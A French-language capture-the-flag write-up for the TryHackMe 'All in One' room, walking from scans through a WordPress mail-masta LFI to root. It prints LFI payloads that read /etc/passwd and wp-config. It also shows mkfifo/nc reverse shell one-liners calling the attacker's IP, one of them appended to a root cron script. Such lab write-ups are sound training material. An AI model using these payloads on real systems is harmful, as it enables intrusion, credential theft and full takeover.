# Room 
https://tryhackme.com/r/room/allinonemj

Ca fait un moment que je n'ai pas pu faire de VM, j'ai un peu de temps libre, alors on va s'en faire une rapido !

Voici une des nombreuses façons de root cette VM. 

# NMAP
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-22 04:31 EDT
Nmap scan report for 10.10.21.127
Host is up (0.035s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.50.195
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:5c:33:22:76:5c:93:66:cd:96:9c:16:6a:b3:17:a4 (RSA)
|   256 1b:6a:36:e1:8e:b4:96:5e:c6:ef:0d:91:37:58:59:b6 (ECDSA)
|_  256 fb:fa:db:ea:4e:ed:20:2b:91:18:9d:58:a0:6a:50:ec (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.89 seconds
```
# FTP
Le ftp accepte les connexions anonyme mais il est vide et on peu rien upload, peut-être qu'il sera utile plus tard ?

# SSH 
Un port SSH, basic, sans bavure ! 

# Serveur web
Le site est une page par defaut de ubuntu

## Gobuster
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.21.127/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.21.127/wordpress/]
/hackathons           (Status: 200) [Size: 197]
```

### /wordpress
Une fois sur le wordpress, en utilisant wpscan on sait qu'il utilise le plugin mail-masta qui est vulnerable au LFI:
Payload : http://10.10.233.10/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

On test donc !

Retour:
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash mysql:x:110:113:MySQL Server,,,:/nonexistent:/bin/false sshd:x:112:65534::/run/sshd:/usr/sbin/nologin ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin 
```
La LFI fonctionne :)

On trouve une session :
```
Elyana
```
On ne vois pas le fichier wp-config de cette façon. On va test en l'encodant avec un filtre php
```
http://10.10.21.127/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php
```
Retour:
```
PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUNCiAqIGluc3RhbGxhdGlvbi4gWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWIgc2l0ZSwgeW91IGNhbg0KICogY29weSB0aGlzIGZpbGUgdG8gIndwLWNvbmZpZy5waHAiIGFuZCBmaWxsIGluIHRoZSB2YWx1ZXMuDQogKg0KICogVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBmb2xsb3dpbmcgY29uZmlndXJhdGlvbnM6DQogKg0KICogKiBNeVNRTCBzZXR0aW5ncw0KICogKiBTZWNyZXQga2V5cw0KICogKiBEYXRhYmFzZSB0YWJsZSBwcmVmaXgNCiAqICogQUJTUEFUSA0KICoNCiAqIEBsaW5rIGh0dHBzOi8vd29yZHByZXNzLm9yZy9zdXBwb3J0L2FydGljbGUvZWRpdGluZy13cC1jb25maWctcGhwLw0KICoNCiAqIEBwYWNrYWdlIFdvcmRQcmVzcw0KICovDQoNCi8vICoqIE15U1FMIHNldHRpbmdzIC0gWW91IGNhbiBnZXQgdGhpcyBpbmZvIGZyb20geW91ciB3ZWIgaG9zdCAqKiAvLw0KLyoqIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZSBmb3IgV29yZFByZXNzICovDQpkZWZpbmUoICdEQl9OQU1FJywgJ3dvcmRwcmVzcycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHVzZXJuYW1lICovDQpkZWZpbmUoICdEQl9VU0VSJywgJ2VseWFuYScgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICdIQGNrbWVAMTIzJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY[...REDACTED...]1V2htels+JFVaOzhyUVlLPlJ6XVZHeUJkbW83PSZHWiFMTyxwQU1zXWYhelZ9eG46NEFQJyApOw0KZGVmaW5lKCAnTE9HR0VEX0lOX1NBTFQnLCAgICd4N3I+fGMwTUxecztTdzIqVSF4LntgNUQ6UDF9Vz0gL2Npe1E8dEVNPXRyU3YxZWVkfF9mc0xgeV5TLFhJPFJZJyApOw0KZGVmaW5lKCAnTk9OQ0VfU0FMVCcsICAgICAgICd2T2IlV3R5fSR6eDlgfD40NUlwQHN5WiBdRzpDM3xTZEQtUDM8e1lQOi5qUERYKUh9d0dtMSpKXk1TYnMkMWB8JyApOw0KDQovKiojQC0qLw0KDQovKioNCiAqIFdvcmRQcmVzcyBEYXRhYmFzZSBUYWJsZSBwcmVmaXguDQogKg0KICogWW91IGNhbiBoYXZlIG11bHRpcGxlIGluc3RhbGxhdGlvbnMgaW4gb25lIGRhdGFiYXNlIGlmIHlvdSBnaXZlIGVhY2gNCiAqIGEgdW5pcXVlIHByZWZpeC4gT25seSBudW1iZXJzLCBsZXR0ZXJzLCBhbmQgdW5kZXJzY29yZXMgcGxlYXNlIQ0KICovDQokdGFibGVfcHJlZml4ID0gJ3dwXyc7DQoNCi8qKg0KICogRm9yIGRldmVsb3BlcnM6IFdvcmRQcmVzcyBkZWJ1Z2dpbmcgbW9kZS4NCiAqDQogKiBDaGFuZ2UgdGhpcyB0byB0cnVlIHRvIGVuYWJsZSB0aGUgZGlzcGxheSBvZiBub3RpY2VzIGR1cmluZyBkZXZlbG9wbWVudC4NCiAqIEl0IGlzIHN0cm9uZ2x5IHJlY29tbWVuZGVkIHRoYXQgcGx1Z2luIGFuZCB0aGVtZSBkZXZlbG9wZXJzIHVzZSBXUF9ERUJVRw0KICogaW4gdGhlaXIgZGV2ZWxvcG1lbnQgZW52aXJvbm1lbnRzLg0KICoNCiAqIEZvciBpbmZvcm1hdGlvbiBvbiBvdGhlciBjb25zdGFudHMgdGhhdCBjYW4gYmUgdXNlZCBmb3IgZGVidWdnaW5nLA0KICogdmlzaXQgdGhlIGRvY3VtZW50YXRpb24uDQogKg0KICogQGxpbmsgaHR0cHM6Ly93b3JkcHJlc3Mub3JnL3N1cHBvcnQvYXJ0aWNsZS9kZWJ1Z2dpbmctaW4td29yZHByZXNzLw0KICovDQpkZWZpbmUoICdXUF9ERUJVRycsIGZhbHNlICk7DQoNCi8qIFRoYXQncyBhbGwsIHN0b3AgZWRpdGluZyEgSGFwcHkgcHVibGlzaGluZy4gKi8NCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==
```
On récupère donc quelques informations intéressante :
```
/** MySQL database username */
define( 'DB_USER', 'elyana' );

/** MySQL database password */
define( 'DB_PASSWORD', 'H@[...REDACTED...]3' );
```
Le compte fonctionne sur wordpress. Nous avons donc un accès.

### /hackatons
Une page avec qu'un text où il est écris : Damn how much I hate the smell of Vinegar :/ !!! 

Mais dans les commentaires de la page on retrouve:
```
<!-- Dvc W@i[...REDACTED...] -->
<!-- KeepGoing -->
```

C'est encoder en vigenère. (Vinegar / Vigenère.... merci le hint !)

La clé est KeepGoing
Cela donne : Try H@[...REDACTED...]3

Qui est le mot de passe de **elyana**.

# Get the revshell !
Maintenant que nous avons l'accès a la page admin du wordpress, on va tout simplement modifier la page d'erreur 404 pour y mettre notre revshell.
Ensuite, plus qu'a générer une page 404 et nous voila avec un revshell:

```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/AllInOne]
└─$ nc -lvnp 4444 
listening on [any] 4444 ...
connect to [10.11.50.195] from (UNKNOWN) [10.10.21.127] 54454
Linux elyana 4.15.0-118-generic #119-Ubuntu SMP Tue Sep 8 12:30:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 09:03:56 up  1:18,  0 users,  load average: 0.03, 0.06, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

# Privesc
Un petit coup de linpeas, on trouve quelques trucs cool comme un containeur LXC 
```
Running LXC Containers
+---------------+---------+-----------------------+-----------------------------------------------+------------+-----------+
|     NAME      |  STATE  |         IPV4          |                     IPV6                      |    TYPE    | SNAPSHOTS |
+---------------+---------+-----------------------+-----------------------------------------------+------------+-----------+
| famous-pigeon | RUNNING | 10.143.211.201 (eth0) | fd42:eac6:4516:770a:216:3eff:fe60:45c5 (eth0) | PERSISTENT | 0         |
+---------------+---------+-----------------------+-----------------------------------------------+------------+-----------+
```
On vois aussi le package **socat** avec un SUID 
```
-rwsr-sr-x 1 root root 392K Apr  4  2018 /usr/bin/socat
```
Dans le containeur, il y a une session root, on va test un revshell depuis le container
```
bash-4.4$ lxc exec famous-pigeon -- sh -c "whoami"
root
```
```
lxc exec famous-pigeon -- sh -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.11.50.195 1234 >/tmp/f"
```
```
┌──(kali㉿kali)-[~/Scripts/PHP]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.11.50.195] from (UNKNOWN) [10.10.21.127] 57558
root@famous-pigeon:~# id
uid=0(root) gid=0(root) groups=0(root)
```
mais bon, y'a rien la dedans. Mauvaise piste ! (Mais je pense qu'il fait parti des vecteurs de privesc sur la machine)

En regardant dans les tache cron, je trouve un script dans **/var/backups/script.sh**
```
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /var/backups/script.sh
```
Il contient :
```
bash-4.4$ cat script.sh 
#!/bin/bash

#Just a test script, might use it later to for a cron task
```
Easy, on va mettre un shell dedans:
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.11.50.195 1234 >/tmp/f" >> script.sh
```
et nous voila avec un shell une fois que le script s'execute via la tache cron:
```
listening on [any] 1234 ...
connect to [10.11.50.195] from (UNKNOWN) [10.10.21.127] 55754
bash: cannot set terminal process group (17826): Inappropriate ioctl for device
bash: no job control in this shell
root@elyana:~# 
```
Nous voici avec les 2 flags, d'un seul coup !
```
root@elyana:/home/elyana# cat user.txt
VEhNezQ5amc2[...REDACTED...]jVlNzZzaHJ1c259
root@elyana:/home/elyana# cat /root/root.txt
VEhNe3VlbTJ3[...REDACTED...]3NwaTg2OHNuMmoxb3NwaTh9
root@elyana:/home/elyana# 
```
